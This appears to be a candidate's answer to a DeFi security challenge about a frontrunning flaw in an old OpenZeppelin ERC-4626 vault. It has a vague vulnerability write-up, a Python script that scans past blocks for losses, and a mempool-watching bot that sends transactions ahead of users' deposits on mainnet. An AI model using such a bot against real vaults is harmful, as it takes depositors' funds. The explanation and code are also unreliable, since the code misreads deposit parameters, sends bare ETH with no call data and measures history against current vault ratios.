# Vault - Tier 1
You are looking through an old version of the OpenZeppelin implementation of ERC-4626 and notice a vulnerability that requires frontrunning an innocent user. You have been granted a large amount of ETH (say e.g. 1k ETH, but you are free to choose the amount :) ) and want to set up a whitehat bot to execute this exploit and return the funds to the user.


- a) Describe the vulnerability and the payoffs for an attacker.

The vulnerability in this older version of OpenZeppelin's ERC-4626 implementation seems to come from how the vault calculates share-to-asset conversions during deposits and withdrawals. It’s prone to a frontrunning attack, where someone can jump ahead of an innocent user’s transaction to manipulate the vault's state. If someone deposits right before the victim, they could make the pool less favorable for the victim, leading to an unfair distribution of assets or shares.

It is profitable for attackers because they can extract value from the victim. By depositing or withdrawing strategically, they could take a larger share of the pool’s assets or force the victim to get fewer assets in return for their shares. This  lets them profit by exploiting how the vault calculates balances in real time.

- b)  Produce code that can check if this vulnerability has occurred in the past and determine how much value was lost, if any.

from web3 import Web3
from datetime import datetime

# node
infura_url = "https://mainnet.infura.io/v3/PROJECT_ID"
w3 = Web3(Web3.HTTPProvider(infura_url))

vault_address = ""
vault_abi = []
vault_contract = w3.eth.contract(address=vault_address, abi=vault_abi)

def check_past_exploits(start_block, end_block):
    exploit_count = 0
    total_loss = 0

    for block in range(start_block, end_block + 1):
        block_data = w3.eth.get_block(block, full_transactions=True)
        for tx in block_data.transactions:
            if tx.to and tx.to.lower() == vault_address.lower():
                try:
                    tx_receipt = w3.eth.get_transaction_receipt(tx.hash)
                    logs = vault_contract.events.Deposit().processReceipt(tx_receipt)
                    
                    for log in logs:
                        user = log['args']['owner']
                        shares = log['args']['shares']
                        assets = log['args']['assets']

                        # Calculate ratio
                        expected_ratio = vault_contract.functions.totalAssets().call() / \
                                         vault_contract.functions.totalSupply().call()
                        actual_ratio = assets / shares

                        if actual_ratio < expected_ratio * 0.95:  # Arbitrary threshold for frontrunning
                            print(f"Potential exploit in block {block} by user {user}")
                            exploit_count += 1
                            total_loss += (expected_ratio - actual_ratio) * shares

                except Exception as e:
                    print(f"Error processing transaction {tx.hash.hex()}: {e}")

    print(f"Exploits detected: {exploit_count}, Total value lost: {total_loss} ETH")
    return exploit_count, total_loss

check_past_exploits(START_BLOCK, END_BLOCK)


- c)  Write code for the bot that can carry out the exploit (don’t worry about returning user funds).

import time
from web3 import Web3

infura_url = "https://mainnet.infura.io/v3/PROJECT_ID"
w3 = Web3(Web3.HTTPProvider(infura_url))

vault_address = ""
vault_abi = []
vault_contract = w3.eth.contract(address=vault_address, abi=vault_abi)

bot_private_key = "KEY"
bot_address = w3.eth.account.privateKeyToAccount(bot_private_key).address

def exploit_opportunity():
    while True:
        # Fetch pending transactions
        mempool = w3.eth.get_block('pending', full_transactions=True)

        for tx in mempool.transactions:
            if tx.to and tx.to.lower() == vault_address.lower():
                try:
                    # Decode transaction and detect vulnerability
                    decoded_tx = vault_contract.decode_function_input(tx.input)
                    function_name, params = decoded_tx

                    if function_name == "deposit":
                        # Calculate potential gains
                        shares = params['shares']
                        assets = params['assets']
                        expected_ratio = vault_contract.functions.totalAssets().call() / \
                                         vault_contract.functions.totalSupply().call()

                        if assets / shares < expected_ratio * 0.95:
                            print("Exploit opportunity detected!")

                            # Prepare exploit transaction
                            tx = {
                                'from': bot_address,
                                'to': vault_address,
                                'value': Web3.toWei(10, 'ether'),  # Adjust value as needed
                                'gas': 300000,
                                'nonce': w3.eth.get_transaction_count(bot_address),
                                'gasPrice': w3.eth.gas_price,
                            }
                            signed_tx = w3.eth.account.sign_transaction(tx, bot_private_key)
                            tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
                            print(f"Exploit transaction sent: {tx_hash.hex()}")

                except Exception as e:
                    print(f"Error analyzing transaction: {e}")

        time.sleep(1)

exploit_opportunity()

